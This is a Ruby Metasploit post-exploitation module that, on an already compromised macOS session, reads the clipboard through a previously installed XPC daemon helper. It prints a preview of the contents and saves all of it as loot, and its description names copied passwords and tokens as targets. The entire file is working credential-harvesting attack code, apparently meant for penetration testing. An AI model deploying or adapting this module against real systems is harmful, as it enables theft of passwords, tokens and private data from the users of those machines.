##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require_relative '../../lib/xpc_helper'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::OSX::Priv
  include Msf::Post::OSX::XPCDaemon
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'         => 'macOS XPC Clipboard Capture',
        'Description'  => %q{
          Captures the current contents of the macOS clipboard (pasteboard) via
          the XPC daemon. Retrieves plain text, rich text, and URL content types.
          Clipboard data is displayed and stored as loot. Useful for capturing
          copied passwords, tokens, and other sensitive data.
        },
        'License'      => MSF_LICENSE,
        'Author'       => ['Mr.Gedik'],
        'Platform'     => ['osx'],
        'SessionTypes' => ['meterpreter', 'shell']
      )
    )
  end

  def run
    unless xpc_client_exists?
      print_error("XPC client not found. Run xpc_daemon_install first.")
      return
    end

    print_status("Capturing clipboard contents via XPC daemon...")
    data = xpc_exec!('cb')
    return if data.nil?

    content = if data.is_a?(Hash)
                data['text'] || data['content'] || data['string'] || data.to_json
              else
                data.to_s
              end

    if content.to_s.strip.empty?
      print_status("Clipboard is empty")
      return
    end

    preview = content.to_s[0..500]
    print_line("--- Clipboard Contents ---")
    print_line(preview)
    print_line("#{'... (truncated)' if content.to_s.length > 500}")
    print_line("--------------------------")

    loot_path = xpc_store_loot(
      'clipboard',
      content.to_s,
      'clipboard.txt',
      'macOS clipboard capture via XPC'
    )
    print_good("Clipboard contents saved to #{loot_path} (#{content.to_s.length} bytes)")
  end
end
